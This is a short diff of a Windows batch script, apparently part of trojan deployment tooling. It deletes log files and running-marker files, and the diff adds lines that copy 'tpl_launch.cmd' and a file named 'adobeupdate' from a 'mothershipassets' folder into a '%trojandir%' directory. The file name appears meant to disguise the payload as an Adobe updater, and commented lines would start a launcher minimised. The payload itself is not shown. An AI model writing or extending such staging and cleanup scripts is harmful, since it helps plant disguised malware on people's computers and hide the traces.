@@ -8,6 +8,7 @@ del /f /q *.log
 del /f /q adobeupdate
 del /f /q *_running
 
-copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\adobeupdate .
+copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd %trojandir%
+copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\adobeupdate %trojandir%
 REM copy /y E:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd .
 REM start "" /min launch.cmd
